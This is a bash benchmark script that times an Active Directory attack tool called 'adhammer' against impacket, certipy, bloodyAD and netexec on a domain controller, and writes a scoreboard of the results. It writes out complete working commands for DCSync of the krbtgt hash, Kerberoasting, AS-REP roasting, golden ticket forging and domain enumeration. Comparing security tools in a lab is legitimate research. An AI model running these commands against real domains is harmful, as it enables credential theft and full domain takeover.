#!/usr/bin/env bash
# ADhammer head-to-head bench: adhammer vs impacket/certipy/bloodyAD/nxc.
# Usage: HOST=<dc-ip> DOMAIN=<realm> USER=<sam> PW=<pw> ./run_bench.sh
# Writes markdown scoreboard to bench/RESULTS.md.
#
# Assumes:
#   • adhammer built at ../target/release/adhammer
#   • Kali WSL (`wsl -d kali-linux`) with impacket-*/certipy/bloodyAD/nxc installed
#     and network reachability to $HOST
#   • Windows-side bloodyAD/certipy also present (mirror check)

set -u
HOST="${HOST:?set HOST=<dc-ip>}"
DOMAIN="${DOMAIN:?set DOMAIN=<dns-realm, e.g. testlab.local>}"
USER="${USER:?set USER=<sAMAccountName>}"
PW="${PW:?set PW=<password>}"
NETBIOS="${NETBIOS:-$(echo "$DOMAIN" | cut -d. -f1 | tr '[:lower:]' '[:upper:]')}"

REPO="$(cd "$(dirname "$0")/.." && pwd)"
ADHAMMER="$REPO/target/release/adhammer"
OUT="$REPO/bench/results.tsv"
LOG="$REPO/bench/full.log"
: > "$OUT"; : > "$LOG"

# wsl_run <cmd…>  — run inside Kali WSL, timed.
wsl_run() { wsl -d kali-linux -e bash -lc "$*"; }

# time_ms <name> <tool> <cmd>  — run cmd, record wall-clock ms, note stdout size + exit code.
time_ms() {
  local scenario="$1" tool="$2"; shift 2
  local start_ns end_ns dur_ms bytes rc
  {
    echo "======================================================================"
    echo "SCENARIO $scenario   TOOL $tool"
    echo "CMD: $*"
    echo "----------------------------------------------------------------------"
  } >> "$LOG"
  start_ns=$(date +%s%N)
  bash -c "$*" >>"$LOG" 2>&1
  rc=$?
  end_ns=$(date +%s%N)
  dur_ms=$(( (end_ns - start_ns) / 1000000 ))
  bytes=$(wc -c <"$LOG")
  printf "%s\t%s\t%s\t%s\n" "$scenario" "$tool" "$dur_ms" "$rc" >> "$OUT"
  printf "  %-32s %-14s %6dms  exit=%d\n" "$scenario" "$tool" "$dur_ms" "$rc"
}

echo "== ADhammer bench vs impacket/certipy/bloodyAD/nxc =="
echo "  target: $USER@$DOMAIN @ $HOST"
echo

# 1) DCSync krbtgt  -----------------------------------------------------------
echo "-- DCSync krbtgt --"
time_ms "dcsync-krbtgt" "adhammer"    "$ADHAMMER attack dcsync --host $HOST --domain $NETBIOS --user $USER --password '$PW' --target krbtgt"
time_ms "dcsync-krbtgt" "impacket"    "wsl_run 'impacket-secretsdump $NETBIOS/$USER:\"$PW\"@$HOST -just-dc-user krbtgt'"
time_ms "dcsync-krbtgt" "netexec"     "wsl_run 'nxc smb $HOST -u $USER -p \"$PW\" --ntds vss --user krbtgt 2>/dev/null || nxc ldap $HOST -u $USER -p \"$PW\" --dcsync krbtgt'"

# 2) Kerberoast  --------------------------------------------------------------
echo "-- Kerberoast --"
time_ms "kerberoast" "adhammer"    "$ADHAMMER attack roast --url ldap://$HOST:389 --user '$NETBIOS\\\\$USER' --password '$PW' --insecure --kdc $HOST"
time_ms "kerberoast" "impacket"    "wsl_run 'impacket-GetUserSPNs $NETBIOS/$USER:\"$PW\" -dc-ip $HOST -request'"
time_ms "kerberoast" "netexec"     "wsl_run 'nxc ldap $HOST -u $USER -p \"$PW\" --kerberoasting /tmp/roast.txt && cat /tmp/roast.txt'"

# 3) SAMR user enumeration  ---------------------------------------------------
echo "-- SAMR enum --"
time_ms "samr-enum" "adhammer" "$ADHAMMER enum samr --host $HOST --domain $NETBIOS --user $USER --password '$PW'"
time_ms "samr-enum" "impacket" "wsl_run 'impacket-samrdump $NETBIOS/$USER:\"$PW\"@$HOST'"
time_ms "samr-enum" "netexec"  "wsl_run 'nxc smb $HOST -u $USER -p \"$PW\" --users'"

# 4) ADCS enumeration  --------------------------------------------------------
echo "-- ADCS enum --"
time_ms "adcs-enum" "adhammer" "$ADHAMMER enum adcs --url ldap://$HOST:389 --user '$NETBIOS\\\\$USER' --password '$PW' --insecure"
time_ms "adcs-enum" "certipy"  "wsl_run 'certipy find -u $USER@$DOMAIN -p \"$PW\" -dc-ip $HOST -stdout'"

# 5) LDAP object read  --------------------------------------------------------
echo "-- LDAP object query (single search) --"
time_ms "ldap-query" "adhammer" "$ADHAMMER enum lsa --host $HOST --domain $NETBIOS --user $USER --password '$PW' --name Administrator"
time_ms "ldap-query" "bloodyad" "bloodyad -d $DOMAIN -u $USER -p '$PW' --host $HOST get search --filter '(sAMAccountName=Administrator)' --attr sAMAccountName,objectSID"

# 6) Full audit (scan-class)  -------------------------------------------------
echo "-- Full audit (LDAP collect + checks) --"
time_ms "full-audit" "adhammer" "$ADHAMMER scan --url ldap://$HOST:389 --user '$NETBIOS\\\\$USER' --password '$PW' --insecure --format html > /tmp/adh_report.html"
time_ms "full-audit" "nxc"      "wsl_run 'nxc ldap $HOST -u $USER -p \"$PW\" --admin-count && nxc ldap $HOST -u $USER -p \"$PW\" --active-users && nxc ldap $HOST -u $USER -p \"$PW\" --asreproast /tmp/asrep.txt --kerberoasting /tmp/kroast.txt'"
time_ms "full-audit" "bloodyad" "bloodyad -d $DOMAIN -u $USER -p '$PW' --host $HOST get children --target 'DC=$(echo $DOMAIN | sed 's/\\./,DC=/g')' | head -50"

# 7) Golden ticket forge  -----------------------------------------------------
# Requires krbtgt AES256 already extracted (from scenario 1). This is a forge-only bench.
echo "-- Golden ticket forge (KDC accept) --"
KRB=${KRB:-<paste-krbtgt-aes256-from-dcsync>}
SID=${SID:-<paste-domain-sid>}
SPN="cifs/$HOST.$DOMAIN"
time_ms "golden-forge" "adhammer" "$ADHAMMER attack golden --realm $(echo $DOMAIN | tr '[:lower:]' '[:upper:]') --krbtgt-aes256 $KRB --domain-sid $SID --verify-spn $SPN --out /tmp/adh.ccache --kdc $HOST"
time_ms "golden-forge" "impacket" "wsl_run 'impacket-ticketer -aesKey $KRB -domain-sid $SID -domain $(echo $DOMAIN | tr '[:lower:]' '[:upper:]') Administrator && ls -l Administrator.ccache'"

echo
echo "=== SCOREBOARD (bench/results.tsv) ==="
cat "$OUT" | column -t -s $'\t'
echo
echo "Full command output: bench/full.log"
